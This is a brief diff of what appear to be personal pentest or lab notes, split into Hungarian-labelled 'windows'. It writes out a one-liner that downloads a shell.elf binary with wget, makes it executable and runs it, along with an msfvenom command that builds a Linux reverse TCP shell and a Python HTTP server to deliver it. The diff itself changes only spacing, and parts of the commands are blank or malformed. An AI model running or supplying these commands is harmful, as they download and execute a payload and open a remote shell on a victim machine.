@@ -7,7 +7,7 @@ ablak I.
       ->  "cd /tmp; rm -f / tmp/shell.elf; wget http://   :8000/shell.elf; chmod 777 /tmp/shell.elf; /tmp/shell.elf"
 ablak II.
   msfvenom -p linux/64x/shell_reverse_tcp LHOST=[...30.0.2.19...]  LPORT=4444 -f elf >shell.elf
-  -> msfvenom -p linux/64x/shell_reverse_tcp LHOST= LPORT=4444 -f elf >shell.elf
+  -> msfvenom -p linux/64x/shell_reverse_tcp LHOST= LPORT=4444 -f elf > shell.elf
 
   python3 -m http.server
 
